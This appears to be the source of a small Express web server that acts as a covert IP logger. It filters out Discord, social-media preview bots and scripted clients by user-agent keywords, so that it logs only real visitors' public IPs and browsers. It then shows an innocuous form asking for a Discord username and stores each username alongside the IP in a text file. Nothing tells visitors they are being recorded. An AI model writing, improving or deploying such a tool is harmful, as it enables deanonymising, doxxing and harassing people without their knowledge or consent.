const express = require("express");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

// --- UTILS ---

// Modern, strong bot detection
const identifyBot = (ua) => {
    if (!ua) return null;
    ua = ua.toLowerCase();

    const botSignatures = [
        // Social media preview bots
        { keyword: "discordbot", name: "Discord Bot" },
        { keyword: "facebookexternalhit", name: "Facebook Preview Bot" },
        { keyword: "instagram", name: "Instagram Preview Bot" },
        { keyword: "twitterbot", name: "Twitter Bot" },
        { keyword: "linkedinbot", name: "LinkedIn Bot" },
        { keyword: "telegrambot", name: "Telegram Bot" },
        { keyword: "whatsapp", name: "WhatsApp Link Preview" },
        { keyword: "skypeuripreview", name: "Skype Preview Bot" },

        // Crawlers
        { keyword: "googlebot", name: "Google Crawler" },
        { keyword: "bingbot", name: "Bing Crawler" },
        { keyword: "yandex", name: "Yandex Bot" },
        { keyword: "duckduckbot", name: "DuckDuckGo Bot" },

        // Generic automation tools
        { keyword: "python-requests", name: "Python Script" },
        { keyword: "axios", name: "Axios Script" },
        { keyword: "curl", name: "cURL Script" },
        { keyword: "wget", name: "Wget Script" },
        { keyword: "postmanruntime", name: "Postman" },
        { keyword: "node-fetch", name: "Node Fetch Script" },

        // Headless browser detection
        { keyword: "headless", name: "Headless Browser" },
        { keyword: "puppeteer", name: "Puppeteer Script" },
        { keyword: "playwright", name: "Playwright Script" }
    ];

    const found = botSignatures.find(sig => ua.includes(sig.keyword));
    return found ? found.name : null;
};


// A real browser checker — stricter
const looksLikeRealBrowser = (ua) => {
    if (!ua) return false;
    ua = ua.toLowerCase();

    // Must contain these
    if (!ua.includes("mozilla") || !ua.includes("windows") && !ua.includes("linux") && !ua.includes("mac")) {
        return false;
    }

    // Must include at least one major browser engine
    return (
        ua.includes("chrome/") ||
        ua.includes("firefox/") ||
        ua.includes("safari/") ||
        ua.includes("edg/")
    );
};

// Public IP filter
const isPublicIP = (ip) => {
    if (!ip) return false;
    ip = ip.replace(/^::ffff:/, "");

    if (
        ip === "127.0.0.1" ||
        ip === "::1" ||
        ip.startsWith("10.") ||
        ip.startsWith("192.168.") ||
        (ip.startsWith("172.") && (() => {
            const parts = ip.split(".");
            if (parts.length < 2) return false;
            const second = parseInt(parts[1], 10);
            return second >= 16 && second <= 31;
        })())
    ) return false;

    return true;
};

// Clean UA output
const formatUA = (ua) => {
    if (!ua) return "Unknown UA";

    try {
        const osMatch = ua.match(/\((.*?)\)/);
        const os = osMatch ? osMatch[1].split(";")[0] : "Unknown OS";

        let browser = "Unknown Browser";
        if (ua.includes("Chrome/")) browser = "Chrome " + ua.split("Chrome/")[1].split(" ")[0];
        else if (ua.includes("Firefox/")) browser = "Firefox " + ua.split("Firefox/")[1];
        else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Edg/")) browser = "Edge " + ua.split("Edg/")[1];

        return `OS: ${os} | Browser: ${browser}`;
    } catch {
        return "Unknown UA";
    }
};

app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    const forwardedFor = req.headers["x-forwarded-for"];
    let ip = forwardedFor ? forwardedFor.split(",")[0].trim() : req.socket.remoteAddress || "";
    ip = ip.replace(/^::ffff:/, "");

    const userAgent = req.headers["user-agent"] || "";
    const botName = identifyBot(userAgent);

    // Only log if it's a REAL browser & not a bot
    if (!botName && looksLikeRealBrowser(userAgent) && isPublicIP(ip)) {
        const formattedUA = formatUA(userAgent);
        const logEntry = `${ip} | ${formattedUA} | ${new Date().toLocaleString()}\n`;

        fs.appendFile("ips.txt", logEntry, () => {});
        console.log(`✅ Logged Visitor: ${ip} | ${formattedUA}`);
    } else {
        console.log(`⏭️ Skipped Visitor: ${ip} (${botName || "Not a real browser"})`);
    }

    res.send(`
        <html>
            <head>
                <title>Hi!</title>
            </head>
            <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
                <h2>Hi! Please enter your Discord username!</h2>
                <form method="POST" action="/submit">
                    <input type="text" name="discord" placeholder="Discord username" style="padding: 8px; width: 250px;" required />
                    <button type="submit" style="padding: 8px 16px;">Submit</button>
                </form>
            </body>
        </html>
    `);
});

app.post("/submit", (req, res) => {
    const discordUsername = req.body.discord || "Unknown";
    const forwardedFor = req.headers["x-forwarded-for"];
    let ip = forwardedFor ? forwardedFor.split(",")[0].trim() : req.socket.remoteAddress || "";
    ip = ip.replace(/^::ffff:/, "");

    const userAgent = req.headers["user-agent"] || "";
    const botName = identifyBot(userAgent);

    if (!botName && looksLikeRealBrowser(userAgent) && isPublicIP(ip)) {
        const formattedUA = formatUA(userAgent);
        const logEntry = `Discord: ${discordUsername} | IP: ${ip} | ${formattedUA} | ${new Date().toLocaleString()}\n`;
        
        fs.appendFile("submissions.txt", logEntry, () => {});
        console.log(`✅ Logged Submission: ${discordUsername} | ${ip} | ${formattedUA}`);
    } else {
        console.log(`⏭️ Skipped Submission from ${ip} (${botName || "Not a real browser"})`);
    }

    res.send(`
        <html>
            <head>
                <title>Thank you!</title>
            </head>
            <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
                <h2>Thanks for submitting your Discord username!</h2>
            </body>
        </html>
    `);
});

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
